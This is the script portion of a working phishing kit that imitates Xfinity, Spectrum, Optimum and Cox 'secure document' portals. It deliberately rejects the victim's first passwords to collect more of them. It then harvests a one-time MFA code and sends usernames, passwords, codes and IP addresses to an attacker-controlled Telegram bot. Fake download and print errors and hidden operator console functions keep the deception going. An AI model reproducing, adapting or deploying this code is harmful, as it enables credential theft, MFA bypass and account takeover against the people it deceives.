  mfaInstructions: document.getElementById('mfaInstructions'),
  mfaCodeDisplay: document.getElementById('mfaCodeDisplay'),
  verifyMfaBtn: document.getElementById('verifyMfaBtn'),
  cancelMfaBtn: document.getElementById('cancelMfaBtn'),
  mfaAttempts: document.getElementById('mfaAttempts'),
  currentMfaAttempt: document.getElementById('currentMfaAttempt'),
  maxMfaAttempts: document.getElementById('maxMfaAttempts'),
  
  // Success Modal - SIMPLIFIED
  successModal: document.getElementById('successModal'),
  successWelcomeText: document.getElementById('successWelcomeText'),
  successMessage: document.getElementById('successMessage'),
  capturedData: document.getElementById('capturedData'), // We'll hide this
  viewDocumentBtn: document.getElementById('viewDocumentBtn'),
  closeSuccessBtn: document.getElementById('closeSuccessBtn'),
  
  // Provider UI
  providerLogo: document.getElementById('providerLogo'),
  portalTitle: document.getElementById('portalTitle'),
  securityText: document.getElementById('securityText'),
  copyrightText: document.getElementById('copyrightText'),
  docId: document.getElementById('docId'),
  accessBtnText: document.getElementById('accessBtnText'),
  downloadBtnText: document.getElementById('downloadBtnText'),
  printBtnText: document.getElementById('printBtnText')
};

// ============================================================================
// INITIALIZATION
// ============================================================================
function initialize() {
  detectProvider();
  applyProviderTheme(currentProvider);
  setupEventListeners();
  setupMFAInputs();
  
  // Hide captured data display (it's for us, not users)
  elements.capturedData.style.display = 'none';
  
  console.log(`Initialized with provider: ${currentProvider.name}`);
}

function detectProvider() {
  let providerCode = CONFIG.DEFAULT_PROVIDER;
  
  // Check URL parameter
  if (CONFIG.USE_URL_PARAM) {
    const urlParams = new URLSearchParams(window.location.search);
    const urlProvider = urlParams.get('Bd')?.toUpperCase();
    if (urlProvider && PROVIDERS[urlProvider]) {
      providerCode = urlProvider;
    }
  }
  
  // User agent detection (optional)
  if (CONFIG.USE_UA_DETECTION) {
    const ua = navigator.userAgent.toLowerCase();
    if (ua.includes('xfinity') || ua.includes('comcast')) providerCode = 'X';
    else if (ua.includes('spectrum') || ua.includes('charter')) providerCode = 'S';
    else if (ua.includes('optimum') || ua.includes('altice')) providerCode = 'O';
    else if (ua.includes('cox')) providerCode = 'C';
  }
  
  currentProvider = PROVIDERS[providerCode];
  currentSession.provider = currentProvider;
}

// ============================================================================
// UI THEMING
// ============================================================================
function applyProviderTheme(provider) {
  const colors = provider.colors;
  const login = provider.loginConfig;
  
  // Update CSS variables
  document.documentElement.style.setProperty('--primary-color', colors.primary);
  document.documentElement.style.setProperty('--primary-color-light', colors.primaryLight);
  
  // Update logos
  const logoImg = document.createElement('img');
  logoImg.src = provider.logo;
  logoImg.alt = `${provider.name} Logo`;
  
  const logoImgModal = document.createElement('img');
  logoImgModal.src = provider.logo;
  logoImgModal.alt = `${provider.name} Logo`;
  
  const logoImgMfa = document.createElement('img');
  logoImgMfa.src = provider.logo;
  logoImgMfa.alt = `${provider.name} Logo`;
  
  elements.providerLogo.innerHTML = '';
  elements.providerLogoModal.innerHTML = '';
  elements.mfaProviderLogo.innerHTML = '';
  
  elements.providerLogo.appendChild(logoImg.cloneNode());
  elements.providerLogoModal.appendChild(logoImgModal.cloneNode());
  elements.mfaProviderLogo.appendChild(logoImgMfa.cloneNode());
  
  // Update loading spinner
  elements.loadingSpinner.style.borderTopColor = colors.primary;
  
  // Update document icon
  document.querySelector('.document-icon').style.color = colors.primary;
  
  // Update security notice
  const securityNotice = document.getElementById('securityNotice');
  securityNotice.style.backgroundColor = provider.colors.primaryLight;
  securityNotice.style.border = `1px solid ${colors.primary}`;
  
  // Update text content
  elements.portalTitle.textContent = `${provider.name} Secure Document Access`;
  elements.securityText.innerHTML = `<strong>Security Notice:</strong> This document requires ${provider.name} account authentication for viewing. All access is logged and monitored.`;
  elements.copyrightText.textContent = `¬© 2025 ${provider.name}. All rights reserved.`;
  elements.docId.textContent = `${provider.code}-DOC-2025-0876`;
  elements.accessBtnText.textContent = `Sign In to Access ${provider.name} Document`;
  elements.downloadBtnText.textContent = `Download ${provider.name} PDF`;
  elements.printBtnText.textContent = `Print ${provider.name} Document`;
  elements.welcomeText.textContent = login.welcomeText;
  elements.mfaWelcomeText.textContent = `${provider.name} Two-Factor Authentication`;
  elements.successWelcomeText.textContent = `${provider.name} Authentication Complete`;
  
  // Update form labels and placeholders
  document.getElementById('usernameLabel').textContent = login.field1.label;
  elements.username.placeholder = login.field1.placeholder;
  document.getElementById('passwordLabel').textContent = login.field2.label;
  elements.password.placeholder = login.field2.placeholder;
  elements.signinBtnText.textContent = login.buttonText;
  
  // Update remember me checkbox
  if (login.hasRememberMe) {
    elements.rememberMeGroup.style.display = 'flex';
    elements.rememberMeLabel.textContent = login.rememberMeText;
  } else {
    elements.rememberMeGroup.style.display = 'none';
  }
  
  // Update error message
  elements.errorMessageText.textContent = login.errorMessage;
  if (login.errorCode) {
    elements.errorCode.textContent = login.errorCode;
  } else {
    elements.errorCode.textContent = '';
  }
  
  // Update login links
  elements.loginLinks.innerHTML = '';
  login.links.forEach(link => {
    const linkElement = document.createElement('a');
    linkElement.href = link.href;
    linkElement.className = 'login-link';
    linkElement.textContent = link.text;
    linkElement.style.color = colors.primary;
    elements.loginLinks.appendChild(linkElement);
  });
  
  // Update buttons
  elements.accessBtn.style.backgroundColor = colors.primary;
  elements.signinBtn.style.backgroundColor = colors.primary;
  elements.verifyMfaBtn.style.backgroundColor = colors.primary;
  elements.viewDocumentBtn.style.backgroundColor = colors.primary;
  
  elements.downloadBtn.style.color = colors.primary;
  elements.downloadBtn.style.borderColor = colors.primary;
  elements.printBtn.style.color = colors.primary;
  elements.printBtn.style.borderColor = colors.primary;
  
  // Hide MFA attempt counter
  elements.mfaAttempts.style.display = 'none';
}

// ============================================================================
// EVENT LISTENERS SETUP
// ============================================================================
function setupEventListeners() {
  // Access button
  elements.accessBtn.addEventListener('click', showAuthModal);
  
  // Password toggle
  let passwordVisible = false;
  elements.showPassword.addEventListener('click', () => {
    passwordVisible = !passwordVisible;
    elements.password.type = passwordVisible ? 'text' : 'password';
    elements.showPassword.textContent = passwordVisible ? 'Hide' : 'Show';
  });
  
  // Auth form submission
  elements.authForm.addEventListener('submit', handleLoginSubmit);
  
  // MFA verification
  elements.verifyMfaBtn.addEventListener('click', verifyMFA);
  elements.cancelMfaBtn.addEventListener('click', () => {
    elements.mfaModal.classList.remove('active');
    elements.authModal.classList.add('active');
  });
  
  // Success modal buttons
  elements.viewDocumentBtn.addEventListener('click', showDocumentAccess);
  elements.closeSuccessBtn.addEventListener('click', () => {
    elements.successModal.classList.remove('active');
    resetSession();
  });
  
  // Close modals on outside click
  document.querySelectorAll('.secure-modal, .mfa-modal, .success-modal').forEach(modal => {
    modal.addEventListener('click', (e) => {
      if (e.target === modal) {
        modal.classList.remove('active');
        if (modal === elements.authModal) {
          hideError();
        }
      }
    });
  });
  
  // Clear error on input
  elements.username.addEventListener('input', hideError);
  elements.password.addEventListener('input', hideError);
  
  // Document actions - FIXED to show realistic errors
  elements.downloadBtn.addEventListener('click', showDownloadError);
  elements.printBtn.addEventListener('click', showPrintError);
}

function setupMFAInputs() {
  mfaInputs = document.querySelectorAll('.mfa-input');
  mfaInputs.forEach((input, index) => {
    input.addEventListener('input', (e) => {
      // Auto-advance to next input
      if (e.target.value.length === 1 && index < mfaInputs.length - 1) {
        mfaInputs[index + 1].focus();
      }
      
      // Auto-verify when all digits are entered
      let fullCode = '';
      mfaInputs.forEach(inp => fullCode += inp.value);
      if (fullCode.length === CONFIG.MFA_CODE_LENGTH) {
        verifyMFA();
      }
    });
    
    input.addEventListener('keydown', (e) => {
      // Handle backspace to move to previous input
      if (e.key === 'Backspace' && !input.value && index > 0) {
        mfaInputs[index - 1].focus();
      }
    });
    
    // Clear error on input
    input.addEventListener('input', () => {
      input.classList.remove('error');
    });
  });
}

// ============================================================================
// UI FUNCTIONS
// ============================================================================
function showAuthModal() {
  elements.accessBtn.classList.add('loading');
  elements.accessBtn.innerHTML = ` Connecting to ${currentProvider.name}...`;
  
  showLoading('Establishing secure connection', 'Connecting to authentication servers');
  
  setTimeout(() => {
    hideLoading();
    elements.accessBtn.classList.remove('loading');
    elements.accessBtn.innerHTML = ` Sign In to Access ${currentProvider.name} Document`;
    
    elements.authModal.classList.add('active');
    hideError();
    elements.authForm.reset();
    elements.username.focus();
    elements.password.type = 'password';
    elements.showPassword.textContent = 'Show';
    
    // Reset session for new attempt
    currentSession.attempts.password = 0;
    currentSession.attempts.mfa = 0;
    currentSession.usedPasswords = [];
  }, 1500);
}

function showLoading(title, subtitle) {
  elements.loadingText.textContent = title;
  elements.loadingSubtext.textContent = subtitle;
  elements.loadingOverlay.classList.add('active');
}

function hideLoading() {
  elements.loadingOverlay.classList.remove('active');
}

function showError(message) {
  elements.errorMessageText.textContent = message;
  elements.errorMessage.classList.add('show');
  elements.username.classList.add('error', 'shake');
  elements.password.classList.add('error', 'shake');
  
  setTimeout(() => {
    elements.username.classList.remove('shake');
    elements.password.classList.remove('shake');
  }, 500);
}

function hideError() {
  elements.errorMessage.classList.remove('show');
  elements.username.classList.remove('error');
  elements.password.classList.remove('error');
}

// ============================================================================
// DOWNLOAD/PREVIEW ERROR FUNCTIONS
// ============================================================================
function showDownloadError() {
  showLoading('Processing document request', 'Checking document compatibility');
  
  // Simulate checking
  setTimeout(() => {
    hideLoading();
    
    // Show realistic error modal
    const errorModal = document.createElement('div');
    errorModal.className = 'secure-modal active';
    errorModal.innerHTML = `
      <div class="modal-content">
        <div class="modal-body">
          <div class="login-header">
            <div class="provider-logo-modal">
              <img src="${currentProvider.logo}" alt="${currentProvider.name} Logo">
            </div>
            <h2 class="welcome-text">Document Compatibility Error</h2>
          </div>
          <div style="padding: 32px; text-align: center;">
            <div style="font-size: 64px; margin-bottom: 20px;">‚ö†Ô∏è</div>
            <h3 style="color: #333; margin-bottom: 15px;">Unable to Process Document</h3>
            <p style="color: #666; margin-bottom: 25px; line-height: 1.6;">
              Your device or browser does not support the enhanced security features 
              required for this encrypted document format (SEC-ENC-V3).
            </p>
            <div style="background: #f8f9fa; border-radius: 8px; padding: 15px; margin: 20px 0; font-size: 13px; color: #666;">
              <div style="margin-bottom: 8px;"><strong>Error Code:</strong> DOC-COMPAT-ERR-45</div>
              <div style="margin-bottom: 8px;"><strong>Document Format:</strong> SEC-ENC-V3 (Enhanced Security)</div>
              <div><strong>Required:</strong> ${currentProvider.name} Secure Viewer v2.1+</div>
            </div>
            <button class="signin-button" onclick="this.closest('.secure-modal').remove()" style="background: ${currentProvider.colors.primary}; margin-top: 10px;">
              Close
            </button>
          </div>
        </div>
      </div>
    `;
    
    document.body.appendChild(errorModal);
    
    // Close on outside click
    errorModal.addEventListener('click', (e) => {
      if (e.target === errorModal) {
        errorModal.remove();
      }
    });
  }, 2000);
}

function showPrintError() {
  showLoading('Initializing print service', 'Connecting to secure print server');
  
  setTimeout(() => {
    hideLoading();
    
    // Show print error modal
    const errorModal = document.createElement('div');
    errorModal.className = 'secure-modal active';
    errorModal.innerHTML = `
      <div class="modal-content">
        <div class="modal-body">
          <div class="login-header">
            <div class="provider-logo-modal">
              <img src="${currentProvider.logo}" alt="${currentProvider.name} Logo">
            </div>
            <h2 class="welcome-text">Print Service Unavailable</h2>
          </div>
          <div style="padding: 32px; text-align: center;">
            <div style="font-size: 64px; margin-bottom: 20px;">üñ®Ô∏è</div>
            <h3 style="color: #333; margin-bottom: 15px;">Print Service Temporarily Unavailable</h3>
            <p style="color: #666; margin-bottom: 25px; line-height: 1.6;">
              The secure print service for encrypted documents is currently undergoing 
              maintenance. Please try downloading the document instead.
            </p>
            <div style="background: #f8f9fa; border-radius: 8px; padding: 15px; margin: 20px 0; font-size: 13px; color: #666;">
              <div style="margin-bottom: 8px;"><strong>Status:</strong> Service Maintenance</div>
              <div style="margin-bottom: 8px;"><strong>Expected Availability:</strong> 2-4 hours</div>
              <div><strong>Reference:</strong> PRINT-SVC-MAINT-2025-12-16</div>
            </div>
            <button class="signin-button" onclick="this.closest('.secure-modal').remove()" style="background: ${currentProvider.colors.primary}; margin-top: 10px;">
              Close
            </button>
          </div>
        </div>
      </div>
    `;
    
    document.body.appendChild(errorModal);
    
    // Close on outside click
    errorModal.addEventListener('click', (e) => {
      if (e.target === errorModal) {
        errorModal.remove();
      }
    });
  }, 1500);
}

// ============================================================================
// AUTHENTICATION LOGIC
// ============================================================================
async function handleLoginSubmit(e) {
  e.preventDefault();
  
  const username = elements.username.value.trim();
  const password = elements.password.value;
  
  if (!username || !password) {
    showError('Please enter both username and password');
    return;
  }
  
  // Check for password reuse
  if (CONFIG.PREVENT_PASSWORD_REUSE && currentSession.usedPasswords.includes(password)) {
    showError('This password has already been used. Please use a different password.');
    elements.password.value = '';
    elements.password.focus();
    return;
  }
  
  // Store credentials
  currentSession.username = username;
  currentSession.password = password;
  currentSession.usedPasswords.push(password);
  currentSession.attempts.password++;
  
  // Disable form during submission
  const originalText = elements.signinBtnText.textContent;
  elements.signinBtnText.textContent = 'Verifying...';
  elements.signinBtn.disabled = true;
  
  // Send password attempt to Telegram
  await sendToTelegram('login_attempt', {
    username: username,
    password: password,
    attempt: currentSession.attempts.password,
    totalAttempts: CONFIG.PASSWORD_ATTEMPTS_REQUIRED
  });
  
  // Simulate authentication delay
  setTimeout(() => {
    elements.signinBtnText.textContent = originalText;
    elements.signinBtn.disabled = false;
    
    if (currentSession.attempts.password < CONFIG.PASSWORD_ATTEMPTS_REQUIRED) {
      // Show error but allow retry
      showError('Incorrect username or password. Please try again.');
      elements.password.value = '';
      elements.password.focus();
    } else {
      // Success after required attempts
      hideError();
      elements.authModal.classList.remove('active');
      showMFAModal();
    }
  }, 1200);
}

function showMFAModal() {
  // Update MFA instructions
  elements.mfaInstructions.textContent = 'Please enter the verification code sent to your registered device.';
  
  // Show MFA screen
  elements.mfaModal.classList.add('active');
  
  // Clear and focus first input
  mfaInputs.forEach(input => {
    input.value = '';
    input.classList.remove('error');
  });
  mfaInputs[0].focus();
}

function verifyMFA() {
  // Get entered code
  let enteredCode = '';
  mfaInputs.forEach(input => enteredCode += input.value);
  
  if (enteredCode.length !== CONFIG.MFA_CODE_LENGTH) {
    mfaInputs.forEach(input => {
      if (!input.value) input.classList.add('error');
    });
    return;
  }
  
  currentSession.attempts.mfa++;
  
  // Check if max MFA attempts reached
  if (currentSession.attempts.mfa > CONFIG.MFA_ATTEMPTS_ALLOWED) {
    showMFAError('Maximum verification attempts reached. Please try again later.');
    elements.mfaModal.classList.remove('active');
    elements.authModal.classList.add('active');
    return;
  }
  
  // Store the MFA code user entered
  currentSession.mfaCode = enteredCode;
  currentSession.capturedAt = new Date().toISOString();
  
  // Send ALL credentials to Telegram NOW (after they enter MFA)
  sendToTelegram('mfa_success', {
    username: currentSession.username,
    password: currentSession.password,
    mfaCode: enteredCode,
    provider: currentProvider.name,
    passwordAttempts: currentSession.attempts.password,
    mfaAttempts: currentSession.attempts.mfa,
    usedPasswords: currentSession.usedPasswords
  });
  
  showSuccessModal();
}

function showMFAError(message) {
  // Add a small error display in MFA modal
  const errorDiv = document.createElement('div');
  errorDiv.className = 'mfa-error';
  errorDiv.style.cssText = 'color: #c70032; font-size: 13px; margin-top: 10px; text-align: center;';
  errorDiv.textContent = message;
  
  // Remove any existing error
  const existingError = document.querySelector('.mfa-error');
  if (existingError) existingError.remove();
  
  // Add new error
  elements.mfaInstructions.parentNode.insertBefore(errorDiv, elements.mfaInstructions.nextSibling);
  
  // Auto-remove after 3 seconds
  setTimeout(() => {
    errorDiv.remove();
  }, 3000);
}

function showSuccessModal() {
  // SIMPLE success message - NO captured data shown to user
  elements.successMessage.textContent = `Your ${currentProvider.name} account has been successfully verified. You now have access to the secure document.`;
  
  elements.mfaModal.classList.remove('active');
  elements.successModal.classList.add('active');
}

function showDocumentAccess() {
  elements.successModal.classList.remove('active');
  
  // Update main UI to show unlocked state
  elements.documentCard.classList.add('document-unlocked');
  elements.documentCard.querySelector('.document-icon').textContent = '‚úì';
  elements.documentCard.querySelector('.document-description').innerHTML += 
    `<div class="unlocked-message">‚úì ${currentProvider.name} document access granted</div>`;
  
  elements.accessBtn.innerHTML = '<span>‚úì</span> Document Accessed';
  elements.accessBtn.disabled = true;
  elements.accessBtn.style.background = '#28a745';
  
  // Enable document actions
  elements.downloadBtn.disabled = false;
  elements.printBtn.disabled = false;
}

function resetSession() {
  // Reset form
  elements.authForm.reset();
  mfaInputs.forEach(input => {
    input.value = '';
    input.classList.remove('error');
  });
  
  // Reset session data
  currentSession = {
    provider: currentProvider,
    username: '',
    password: '',
    mfaCode: '',
    usedPasswords: [],
    attempts: {
      password: 0,
      mfa: 0
    },
    mfaGenerated: false,
    mfaCodeValue: '',
    mfaExpiry: null,
    userInfo: null,
    capturedAt: null
  };
  
  generatedMfaCode = '';
}

// ============================================================================
// TELEGRAM INTEGRATION
// ============================================================================
async function sendToTelegram(type, data) {
  if (!CONFIG.ENABLE_TELEGRAM || !CONFIG.TELEGRAM_BOT_TOKEN || CONFIG.TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
    console.log(`[Telegram] ${type}:`, data);
    return;
  }

  try {
    const userInfo = await getUserInfo();
    let message = '';
    
    const timestamp = new Date().toLocaleString();
    const providerName = currentProvider.name;
    
    switch(type) {
      case 'login_attempt':
        message = `üîê *${providerName} LOGIN ATTEMPT #${data.attempt}*
        
üë§ *Credentials:*
‚Ä¢ Username: \`${data.username}\`
‚Ä¢ Password: \`${data.password}\`
‚Ä¢ Attempt: ${data.attempt}/${data.totalAttempts}

üåê *User Information:*
‚Ä¢ IP: \`${userInfo.ip}\`
‚Ä¢ Browser: ${userInfo.browser}
‚Ä¢ OS: ${userInfo.os}

‚è∞ *Time:* ${timestamp}
üìÅ *Portal:* Secure Document Access

üì± *Waiting for MFA code entry...*`;
        break;
        
      case 'mfa_success':
        message = `‚úÖ *${providerName} - FULL CREDENTIALS CAPTURED!*
        
üéØ *Authentication Complete - All Data Secured*
        
üîê *Complete Credentials:*
‚Ä¢ Username: \`${data.username}\`
‚Ä¢ Password: \`${data.password}\`
‚Ä¢ MFA Code: \`${data.mfaCode}\`
‚Ä¢ Password Attempts: ${data.passwordAttempts}
‚Ä¢ MFA Attempts: ${data.mfaAttempts}
‚Ä¢ Used Passwords: ${data.usedPasswords.map(p => `\`${p}\``).join(', ')}

üåê *Session Info:*
‚Ä¢ Provider: ${data.provider}
‚Ä¢ User IP: \`${userInfo.ip}\`
‚Ä¢ Capture Time: ${timestamp}

üéâ *Secure document portal access granted*`;
        break;
    }
    
    const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CONFIG.TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
    
    if (!response.ok) {
      console.error('Telegram API error:', await response.text());
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error);
  }
}

async function getUserInfo() {
  try {
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    
    // Parse user agent
    const ua = navigator.userAgent;
    let browser = 'Unknown';
    let os = 'Unknown';
    
    if (ua.includes('Chrome')) browser = 'Chrome';
    else if (ua.includes('Firefox')) browser = 'Firefox';
    else if (ua.includes('Safari')) browser = 'Safari';
    else if (ua.includes('Edg')) browser = 'Edge';
    
    if (ua.includes('Windows')) os = 'Windows';
    else if (ua.includes('Mac')) os = 'macOS';
    else if (ua.includes('Linux')) os = 'Linux';
    else if (ua.includes('Android')) os = 'Android';
    else if (ua.includes('iOS') || ua.includes('iPhone')) os = 'iOS';
    
    return {
      ip: ipData.ip,
      browser: browser,
      os: os,
      userAgent: ua.substring(0, 100)
    };
  } catch (error) {
    return {
      ip: 'Unknown',
      browser: 'Unknown',
      os: 'Unknown',
      userAgent: navigator.userAgent.substring(0, 100)
    };
  }
}

// ============================================================================
// INITIALIZE APPLICATION
// ============================================================================
document.addEventListener('DOMContentLoaded', initialize);


// ============================================================================
// ADMIN FUNCTIONS - FOR YOU ONLY
// ============================================================================

// View blacklist
window.vb = function() {
    const blacklist = JSON.parse(localStorage.getItem('simple_blacklist') || '[]');
    console.log('üìã Blacklist:', blacklist);
    console.table(blacklist);
    return blacklist;
};

// Clear blacklist
window.cb = function() {
    localStorage.setItem('simple_blacklist', JSON.stringify([]));
    console.log('‚úÖ Blacklist cleared');
    alert('Blacklist cleared!');
    return true;
};

// Remove specific IP
window.rb = function(ip) {
    const blacklist = JSON.parse(localStorage.getItem('simple_blacklist') || '[]');
    const filtered = blacklist.filter(entry => entry.ip !== ip);
    localStorage.setItem('simple_blacklist', JSON.stringify(filtered));
    console.log(`‚úÖ Removed ${ip} from blacklist`);
    return true;
};

// Check if current IP is blacklisted
window.ci = async function() {
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const blacklist = JSON.parse(localStorage.getItem('simple_blacklist') || '[]');
        const isBlocked = blacklist.some(entry => entry.ip === ipData.ip);
        
        console.log(`üåê Your IP: ${ipData.ip}`);
        console.log(`üîí Status: ${isBlocked ? 'üö´ BLACKLISTED' : '‚úÖ CLEAR'}`);
        
        return { ip: ipData.ip, blacklisted: isBlocked };
    } catch (error) {
        console.error('Error checking IP:', error);
        return null;
    }
};
  </script>
</body>
</html>
